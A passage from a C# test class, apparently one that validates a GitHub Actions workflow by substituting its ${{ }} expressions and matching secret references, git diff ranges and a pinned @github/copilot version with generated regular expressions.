            expressions.ShouldContainKey(expression, $"The workflow uses ${{{{ {expression} }}}}, which this test does not provide.");
            return expressions[expression];
        });

    [GeneratedRegex(@"\$\{\{\s*(.+?)\s*\}\}")]
    private static partial Regex Expression();

    [GeneratedRegex(@"secrets\.([A-Za-z0-9_]+)")]
    private static partial Regex SecretReference();

    [GeneratedRegex(@"\(git diff (\S+\.\.\.\S+)\)")]
    private static partial Regex DiffRange();

    [GeneratedRegex(@"^@github/copilot@\d+\.\d+\.\d+$")]
    private static partial Regex ExactCopilotVersion();
}
